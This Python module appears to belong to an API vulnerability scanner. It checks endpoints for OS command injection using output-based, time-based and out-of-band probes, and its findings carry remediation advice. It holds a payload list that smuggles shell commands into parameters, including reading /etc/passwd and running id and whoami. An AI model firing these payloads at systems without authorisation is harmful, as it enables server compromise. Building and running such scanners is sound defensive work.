from __future__ import annotations

import logging
import time
from typing import Any, Dict, List, Optional

from app.scanners.api_scanner.engine.oob_server import OOBTracker
from app.scanners.api_scanner.engine.oob_tokens import cmdi_oob_payloads
from app.scanners.api_scanner.engine.payload_encoder import encode_for_context
from app.scanners.api_scanner.engine.request_executor import execute_request
from app.scanners.api_scanner.tests import build_url, make_finding

logger = logging.getLogger(__name__)

OWASP = "Injection"
REF = "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection"
CVSS_VEC = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"

def _command_payloads(marker: str):
    """Generate command injection payloads with a unique marker."""
    return [
        (f"; echo {marker}", marker.lower()),
        (f"| echo {marker}", marker.lower()),
        (f"& echo {marker}", marker.lower()),
        (f"`echo {marker}`", marker.lower()),
        (f"$(echo {marker})", marker.lower()),
        (f"; echo {marker} #", marker.lower()),
        (f"|| echo {marker}", marker.lower()),
        (f"&& echo {marker}", marker.lower()),
        (f";{{echo,{marker}}}", marker.lower()),
        (f"|cat /etc/passwd #", "root:x:0:0"),
        (f"; id", "uid="),
        (f"| whoami", ""),  # any non-empty response different from baseline
    ]

# Time-based payloads
TIME_PAYLOADS = [
    "; sleep 3",
    "| sleep 3",
    "& timeout 3",
]

TIME_THRESHOLD = 2.5


async def run_command_injection_tests(
    endpoint: Dict[str, Any],
    base_url: str,
    auth_headers: Dict[str, str],
    query_params: Dict[str, str],
    oob_tracker: Optional[OOBTracker] = None,
) -> List[Dict[str, Any]]:
    """Run OS command injection checks on string parameters and body fields."""
    findings: List[Dict[str, Any]] = []
    method = endpoint.get("method", "GET")
    path = endpoint.get("path", "")
    ep_label = f"{method} {path}"
    url = build_url(base_url, path, query_params)
    merged_headers = {**auth_headers, "Content-Type": "application/json"}

    # Collect injectable targets: query params + body fields
    targets: List[Dict[str, str]] = []

    for p in endpoint.get("parameters", []):
        if p.get("in") == "query" and p.get("type", "string") == "string":
            targets.append({"location": "query", "name": p.get("name", "")})

    if method in ("POST", "PUT", "PATCH"):
        for field in (endpoint.get("body") or {}):
            targets.append({"location": "body", "name": field})

    if not targets:
        return findings

    from app.scanners.api_scanner.engine.scan_context import ScanContext
    ctx = ScanContext()
    payloads = _command_payloads(ctx.cmd_marker)

    # Get baseline timing
    baseline_start = time.time()
    await execute_request(method, url, headers=merged_headers,
                          body=endpoint.get("body") if method in ("POST", "PUT", "PATCH") else None)
    baseline_time = time.time() - baseline_start

    for target in targets[:3]:  # Limit to first 3 targets
        # ── Output-based detection ────────────────────────────────────
        for payload, signature in payloads:
            ctx_type = "query" if target["location"] == "query" else "body"
            for encoded_payload, enc_desc in encode_for_context(payload, ctx_type, max_variants=3):
                if target["location"] == "query":
                    test_params = {**query_params, target["name"]: encoded_payload}
                    test_url = build_url(base_url, path, test_params)
                    resp, evidence = await execute_request(method, test_url, headers=merged_headers)
                else:
                    test_body = dict(endpoint.get("body") or {})
                    test_body[target["name"]] = encoded_payload
                    resp, evidence = await execute_request(method, url, headers=merged_headers, body=test_body)

                if resp is None:
                    continue

                if signature and signature in (resp.text or "").lower():
                    findings.append(make_finding(
                        owasp_category=OWASP,
                        title=f"OS Command Injection — {target['location']}: {target['name']}",
                        cvss_vector=CVSS_VEC,
                        endpoint=ep_label,
                        description=f"Command injection confirmed. The payload '{payload}' ({enc_desc}) was executed and the command output '{signature}' appeared in the response.",
                        evidence=evidence,
                        impact="Full server compromise. Attacker can execute arbitrary OS commands, read files, install backdoors, and pivot to internal network.",
                        remediation="Never pass user input to OS commands. Use language-native libraries instead of shell execution. If shell commands are unavoidable, use strict allowlists.",
                        references=[REF],
                    ))
                    return findings  # Critical — one proof is enough

        # ── Time-based detection ──────────────────────────────────────
        for payload in TIME_PAYLOADS:
            if target["location"] == "query":
                test_params = {**query_params, target["name"]: payload}
                test_url = build_url(base_url, path, test_params)
                start = time.time()
                resp, evidence = await execute_request(method, test_url, headers=merged_headers, timeout=15)
            else:
                test_body = dict(endpoint.get("body") or {})
                test_body[target["name"]] = payload
                start = time.time()
                resp, evidence = await execute_request(method, url, headers=merged_headers, body=test_body, timeout=15)

            elapsed = time.time() - start
            if elapsed - baseline_time > TIME_THRESHOLD:
                findings.append(make_finding(
                    owasp_category=OWASP,
                    title=f"OS Command Injection (Time-based) — {target['location']}: {target['name']}",
                    cvss_vector=CVSS_VEC,
                    endpoint=ep_label,
                    description=f"Time-based command injection detected. Payload '{payload}' caused {elapsed:.1f}s delay (baseline: {baseline_time:.1f}s).",
                    evidence=evidence,
                    impact="Blind command injection. Attacker can execute OS commands even though output is not directly visible.",
                    remediation="Never pass user input to OS commands. Use language-native libraries for file operations, network calls, etc.",
                    confidence="MEDIUM",
                    references=[REF],
                ))
                return findings

    # ── OOB Command Injection probes ─────────────────────────────────
    if oob_tracker and oob_tracker.enabled:
        for target in targets[:3]:
            callback_url = oob_tracker.generate_payload_url(
                "cmdi", ep_label, f"CmdI OOB via {target['name']}"
            )
            oob_payloads = cmdi_oob_payloads(callback_url)
            for payload, desc in oob_payloads:
                if target["location"] == "query":
                    test_params = {**query_params, target["name"]: payload}
                    test_url = build_url(base_url, path, test_params)
                    await execute_request(method, test_url, headers=merged_headers)
                else:
                    test_body = dict(endpoint.get("body") or {})
                    test_body[target["name"]] = payload
                    await execute_request(method, url, headers=merged_headers, body=test_body)
                logger.debug("OOB CmdI probe sent: %s — %s", target["name"], desc)

    return findings
